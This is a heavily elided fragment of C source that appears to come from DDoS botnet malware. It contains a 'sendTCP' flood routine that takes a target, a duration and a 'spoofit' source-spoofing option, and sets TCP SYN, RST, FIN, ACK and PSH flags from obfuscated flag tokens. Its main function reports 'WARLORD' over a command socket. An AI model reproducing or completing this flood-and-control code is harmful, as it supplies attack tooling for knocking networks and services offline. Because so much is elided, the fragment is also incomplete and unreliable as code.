...
void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        ...
        if(!strcmp(flags, "*;;")) //all
        {
                ...
                while(pch)
                {
                        if(!strcmp(pch,         "xs\"")) //syn
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "Uxz")) //rst
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "(B\"")) //fin
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "*?%")) //ack
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "wxA")) //psh
                        {
                                tcph->psh = 1;
                        } else {
...
int main(int argc, unsigned char *argv[])
{
    ...
    sockprintf(mainCommSock, "WARLORD");
